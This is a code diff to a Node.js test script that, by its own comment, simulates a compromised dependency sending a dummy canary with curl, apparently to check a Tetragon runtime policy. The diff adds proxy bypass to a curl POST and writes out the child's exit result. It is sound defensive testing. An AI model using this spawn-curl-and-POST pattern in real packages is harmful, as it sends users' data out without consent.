@@ -1,4 +1,5 @@
 import { spawnSync } from 'node:child_process';
+import { writeFileSync } from 'node:fs';
 
 /**
  * Simulates a compromised dependency sending a dummy canary with curl.
@@ -26,6 +27,8 @@ function main() {
       '--show-error',
       '--max-time',
       '5',
+      '--noproxy',
+      '*',
       '--request',
       'POST',
       '--data-urlencode',
@@ -34,6 +37,16 @@ function main() {
     ],
     { stdio: 'inherit' },
   );
+
+  // Record the child result independently of Tetragon's configured action label.
+  const resultPath = process.env.CANARY_ATTACK_RESULT;
+  if (resultPath !== undefined) {
+    writeFileSync(
+      resultPath,
+      `${JSON.stringify({ exitCode: result.status, signal: result.signal, error: result.error?.code ?? null }, null, 2)}\n`,
+      { encoding: 'utf8', mode: 0o644 },
+    );
+  }
 
   if (result.error !== undefined || result.status !== 0) {
     const reason = result.signal ?? result.error?.message ?? `exit ${result.status}`;
